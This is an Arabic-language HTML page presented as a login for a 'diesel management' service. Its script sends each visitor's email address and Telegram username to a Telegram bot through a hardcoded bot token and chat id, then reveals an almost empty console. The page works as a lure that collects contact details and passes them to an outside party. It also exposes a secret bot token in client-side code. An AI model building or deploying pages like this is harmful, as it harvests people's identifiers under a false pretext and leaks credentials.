<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIESEL | LOGIN</title>
    <style>
        /* ستايل صفحة تسجيل الدخول */
        #login-overlay { position: fixed; top:0; left:0; width: 100%; height: 100%; background: #0a0e14; z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .login-card { background: #161b22; padding: 30px; border: 1px solid #30363d; border-radius: 8px; width: 320px; text-align: center; }
        input { width: 90%; padding: 10px; margin: 10px 0; background: #0d1117; border: 1px solid #30363d; color: white; }
        button { background: #238636; color: white; padding: 10px 20px; border: none; cursor: pointer; width: 100%; }
        #main-content { display: none; } /* مخفي حتى يسجل دخول */
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-card">
            <h2>تسجيل دخول للخدمة</h2>
            <input type="email" id="email" placeholder="البريد الإلكتروني (Gmail/FB)">
            <input type="text" id="username" placeholder="يوزر التليجرام الخاص بك">
            <button onclick="login()">دخول</button>
        </div>
    </div>

    <div id="main-content">
        <h1>وحدة تحكم إدارة الديزل</h1>
        </div>

    <script>
        (function(){if(!window.chatbase||window.chatbase("getState")!=="initialized"){window.chatbase=(...arguments)=>{if(!window.chatbase.q){window.chatbase.q=[]}window.chatbase.q.push(arguments)};window.chatbase=new Proxy(window.chatbase,{get(target,prop){if(prop==="q"){return target.q}return(...args)=>target(prop,...args)}})}const onLoad=function(){const script=document.createElement("script");script.src="https://www.chatbase.co/embed.min.js";script.id="DdngL8r3s2pfzL6hG2oIO";script.domain="www.chatbase.co";document.body.appendChild(script)};if(document.readyState==="complete"){onLoad()}else{window.addEventListener("load",onLoad)}})();
    </script>

    <script>
        function login() {
            const email = document.getElementById('email').value;
            const user = document.getElementById('username').value;
            const token = '8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU';
            const chat_id = '5177962707';

            if(!email || !user) return alert("يرجى إكمال البيانات");

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: chat_id, text: `👤 تسجيل دخول جديد:\n📧 Email: ${email}\n📱 Telegram: ${user}`})
            }).then(() => {
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('main-content').style.display = 'block';
            });
        }
    </script>
</body>
</html>
